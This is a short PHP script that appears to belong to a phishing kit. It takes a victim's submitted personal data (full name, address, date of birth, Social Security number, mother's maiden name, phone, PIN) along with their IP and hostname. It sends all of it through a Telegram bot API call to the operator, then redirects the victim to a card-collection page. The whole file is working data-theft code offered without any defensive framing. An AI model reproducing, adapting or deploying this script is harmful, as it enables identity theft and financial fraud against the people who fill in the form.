<?php
session_start();
include "../config.php";
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg .= "✍🏻 𝙱𝚒𝚕𝚕𝚒𝚗𝚐 𝙸𝚗𝚏𝚘𝚛𝚖𝚊𝚝𝚒𝚘𝚗𝚜 ✍🏻\n";
$msg .= "\n";
$msg .= "𝙵𝚞𝚕𝚕 𝙽𝚊𝚖𝚎: ".$_POST['j_fullname']."\n";
$msg .= "𝙰𝚍𝚍𝚛𝚎𝚜𝚜: ".$_POST['j_address']."\n";
$msg .= "𝙳𝙾𝙱: ".$_POST['dob']."\n";
$msg .= "𝚂𝚂𝙽: ".$_POST['ssn']."\n";
$msg .= "𝙼𝙼𝙽: ".$_POST['j_mmn']."\n";
$msg .= "𝙿𝚑𝚘𝚗𝚎: ".$_POST['j_phone']."\n";
$msg .= "𝘿𝙇𝙉: ".$_POST['j_pin']."\n";
$msg .= "\n";
$msg .= "IP: ".$ip."\n";
$msg .= "HostName : ".$hostname."\n";

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );


header("Location: cc.php");  	  
?>


